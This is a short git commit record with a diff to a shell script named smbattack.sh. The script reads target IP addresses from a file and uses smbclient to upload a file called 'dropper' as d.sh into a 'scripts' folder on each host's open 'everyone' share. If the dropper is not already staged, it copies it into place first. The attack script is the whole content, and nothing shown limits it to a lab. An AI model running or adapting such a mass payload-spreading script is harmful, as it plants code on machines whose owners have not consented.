efb76dccea68e0f6c89c2ea827b47bf68200aa3d
Austin Cundiff <austin.cundiff48@gmail.com>
2019-12-24 14:54:41 -0500

    added more functionality to smbattack

--- unix_scripts/smbattack.sh
+++ unix_scripts/smbattack.sh
@@ -1,4 +1,8 @@
 #!/bin/bash
-for i in $(cat ips.txt); do
-	smbclient //$i/everyone/ -c "cd scripts; put /upload/d.sh d.sh";
-done	
+if [ -f /upload/dropper ]; then
+	for i in $(cat ips.txt); do
+		smbclient //$i/everyone/ -c "cd scripts; put /upload/dropper d.sh";
+	done	
+else
+	cp ./dropper /upload/dropper
+fi
